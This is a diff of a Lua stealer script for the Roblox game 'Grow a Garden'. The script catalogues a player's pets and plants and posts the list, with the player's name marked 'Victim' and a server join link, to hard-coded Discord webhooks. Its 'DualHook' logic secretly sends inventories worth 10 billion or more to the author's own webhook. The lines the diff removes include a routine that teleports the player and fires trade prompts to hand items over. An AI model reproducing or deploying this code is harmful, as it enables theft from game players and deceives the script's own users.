@@ -1,6 +1,7 @@
+-- Core.lua - Full inventory logger + Steal + DualHook logic
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 local backpack = plr:WaitForChild("Backpack")
 local replicatedStorage = game:GetService("ReplicatedStorage")
@@ -11,146 +12,125 @@ local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUt
 local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
--- External Settings
-local webhook = getfenv().Webhook
-local username = getfenv().Username
+-- SETTINGS OUTSIDE
+local Webhook = getfenv().Webhook
+local Username = getfenv().Username
 
--- Internal DualHook
-local webhook2 = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
-local username2 = "namnnni2"
+-- DUAL HOOK CONFIG (SET INSIDE)
+local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
+local DualUsername = "namnnni2"
 
--- Static
-local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+-- Auto fallback
+if not Webhook or not Username then return warn("Missing Webhook or Username") end
+
+-- RULES
 local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 
--- State
-local itemsToSend, totalValue = {}, 0
-local hasRare, hasHeavy = false, false
-local selectedUser, selectedWebhook = username, webhook
+-- START
+local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false
 
--- Utils
 local function formatNumber(n)
-    local suffix = {"", "k", "m", "b", "t"}
-    local i = 1
-    while n >= 1000 and i < #suffix do
-        n = n / 1000
-        i += 1
-    end
-    return string.format("%.2f%s", n, suffix[i])
+	local suffix = {"", "k", "m", "b", "t"}
+	local idx = 1
+	while n >= 1000 and idx < #suffix do
+		n = n / 1000
+		idx += 1
+	end
+	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
 end
 
 local function calcPetValue(petData)
-    local egg = petData.PetData.HatchedFrom
-    if not egg then return 0 end
-    local rarity = petRegistry.PetEggs[egg]?.RarityData?.Items[petData.PetType]
-    if not rarity then return 0 end
-    local range = rarity.GeneratedPetData.WeightRange
-    local lerpVal = numberUtil.ReverseLerp(range[1], range[2], petData.PetData.BaseWeight)
-    local wMult = math.lerp(0.8, 1.2, lerpVal)
-    local lvlMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
-    return math.floor(petRegistry.PetList[petData.PetType].SellPrice * wMult * lvlMult)
+	local egg = petData.PetData.HatchedFrom
+	if not egg then return 0 end
+	local data = petRegistry.PetEggs[egg]
+	local rarity = data and data.RarityData.Items[petData.PetType]
+	if not rarity then return 0 end
+	local r = rarity.GeneratedPetData.WeightRange
+	if not r then return 0 end
+	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
+	local weightMult = math.lerp(0.8, 1.2, lerp)
+	local levelMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
+	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
 end
 
 -- Inventory Scan
 for _, tool in ipairs(backpack:GetChildren()) do
-    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
-        if tool:GetAttribute("ItemType") == "Pet" then
-            local petData = dataService:GetData().PetsData.PetInventory.Data[tool:GetAttribute("PET_UUID")]
-            local name = petData.PetType
-            local val = calcPetValue(petData)
-            local weight = tonumber(petData.PetData.BaseWeight) or 0
-            if weight >= 10 then hasHeavy = true end
-            if table.find(rarePets, name) then hasRare = true end
-            totalValue += val
-            table.insert(itemsToSend, {Tool = tool, Name = name, Value = val, Weight = weight, Type = "Pet"})
-        else
-            local val = calcPlantValue(tool)
-            totalValue += val
-            table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Value = val, Weight = 0, Type = "Plant"})
-        end
-    end
+	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+		if tool:GetAttribute("ItemType") == "Pet" then
+			local id = tool:GetAttribute("PET_UUID")
+			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
+			local petName = petData.PetType
+			local weight = tonumber(petData.PetData.BaseWeight) or 0
+			local value = calcPetValue(petData)
+
+			if table.find(rarePets, petName) then hasRare = true end
+			if weight >= 10 then hasHeavy = true end
+			totalValue += value
+			table.insert(itemsToSend, {Name = petName, Weight = weight, Value = value, Type = "Pet"})
+		else
+			local value = calcPlantValue(tool)
+			totalValue += value
+			table.insert(itemsToSend, {Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
+		end
+	end
 end
 
--- Use DualHook if >=10b
-if totalValue >= 10_000_000_000 then
-    selectedUser = username2
-    selectedWebhook = webhook2
-end
+if #itemsToSend == 0 then return end
 
--- Sort Items
 table.sort(itemsToSend, function(a, b)
-    local rankA = (table.find(rarePets, a.Name) and 1 or (a.Type == "Pet" and a.Weight >= 10 and 2 or a.Type == "Pet" and 3 or 4))
-    local rankB = (table.find(rarePets, b.Name) and 1 or (b.Type == "Pet" and b.Weight >= 10 and 2 or b.Type == "Pet" and 3 or 4))
-    return rankA < rankB
+	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
+	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
+	return a.Value > b.Value
 end)
 
--- Send Inventory Webhook
-local itemList = ""
+-- Determine webhook
+local useDual = totalValue >= 10_000_000_000
+local finalWebhook = useDual and DualWebhook or Webhook
+local finalUsername = useDual and DualUsername or Username
+
+-- Compose Message
+local content = (hasRare or hasHeavy) and "@everyone\n" or ""
+content ..= "**GROW A GARDEN HIT - By namnnni2**\n"
+content ..= "**JobId:** `" .. game.JobId .. "`"
+
+local lines = ""
 for _, item in ipairs(itemsToSend) do
-    itemList ..= string.format("%s (%.2f KG): ₵%s\n", item.Name, item.Weight, formatNumber(item.Value))
-    if #itemList > 900 then itemList ..= "..."; break end
+	lines ..= string.format("%s (%.2f KG): ₵%s\n", item.Name, item.Weight, formatNumber(item.Value))
+	if #lines > 1024 then
+		lines = lines:sub(1, 1000) .. "\n...more items"
+		break
+	end
 end
 
-local content = hasRare or hasHeavy and "@everyone\n" or ""
-content ..= "**GROW A GARDEN HIT - By namnnni2**\n"
-content ..= "`JobId:` `" .. game.JobId .. "`"
+local payload = {
+	content = content,
+	embeds = {{
+		title = "🎯 Full Inventory Report",
+		color = 65280,
+		fields = {
+			{name = "Victim", value = plr.Name, inline = true},
+			{name = "Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
+			{name = "Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
+			{name = "Inventory", value = lines, inline = false}
+		},
+		footer = { text = "GAG Stealer by " .. finalUsername }
+	}}
+}
+
+-- Auto HTTP sender
+local function getRequest()
+	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
+end
 
 pcall(function()
-    http_request({
-        Url = selectedWebhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({
-            content = content,
-            embeds = {{
-                title = "🎯 Inventory Stolen!",
-                color = 65280,
-                fields = {
-                    {name = "Victim", value = plr.Name, inline = true},
-                    {name = "Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
-                    {name = "Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId},
-                    {name = "Items", value = itemList}
-                },
-                footer = {text = "GAG Stealer by namnnni2"}
-            }}
-        })
-    })
-end)
-
--- Steal Trigger
-local function doSteal(target)
-    local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
-    local victimHrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
-    if not (hrp and victimHrp) then return end
-
-    local promptRoot = victimHrp:FindFirstChildWhichIsA("ProximityPrompt", true) or victimHrp:WaitForChild("ProximityPrompt", 3)
-
-    for _, item in ipairs(itemsToSend) do
-        repeat
-            item.Tool.Parent = plr.Character
-            hrp.CFrame = victimHrp.CFrame * CFrame.new(0, 0, 2)
-            fireproximityprompt(promptRoot)
-            wait(0.25)
-        until not backpack:FindFirstChild(item.Tool.Name)
-    end
-end
-
--- Listen for selectedUser chat
-for _, p in ipairs(Players:GetPlayers()) do
-    if p.Name == selectedUser then
-        p.Chatted:Connect(function()
-            task.spawn(function()
-                doSteal(p)
-            end)
-        end)
-    end
-end
-Players.PlayerAdded:Connect(function(p)
-    if p.Name == selectedUser then
-        p.Chatted:Connect(function()
-            task.spawn(function()
-                doSteal(p)
-            end)
-        end)
-    end
+	local req = getRequest()
+	if req then
+		req({
+			Url = finalWebhook,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(payload)
+		})
+	end
 end)
